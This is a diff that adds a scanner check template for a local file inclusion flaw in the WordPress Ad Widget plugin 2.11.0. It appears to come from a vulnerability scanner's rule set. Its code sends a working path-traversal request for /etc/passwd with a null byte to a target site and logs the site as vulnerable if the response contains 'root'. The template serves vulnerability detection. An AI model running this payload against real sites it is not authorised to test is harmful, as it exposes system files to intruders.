@@ -1,0 +1,20 @@
+information:
+  name: WordPress Plugin WordPress Ad Widget Local File Inclusion (2.11.0)
+  id: ad-widget-lfi
+  description: Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks.
+  risk: high
+  authors: 0x_Akoko
+  tags: wordpress, lfi, path-traversal, wp-plugin
+  references:
+    - https://cxsecurity.com/issue/WLB-2017100084
+    - https://plugins.trac.wordpress.org/changeset/1628751/ad-widget
+
+code: |
+  let path = "/wp-content/plugins/ad-widget/views/modal/?step=../../../../../../../etc/passwd%00"
+  let response = await _MakeQuest_(`{{url}}${path}`)
+
+  if(response.data.indexOf("root") != -1 && response.status == 200){
+    Logger.attack_log({{self_info}}, `{{url}}${path}`)
+  }
+
+  resolve()
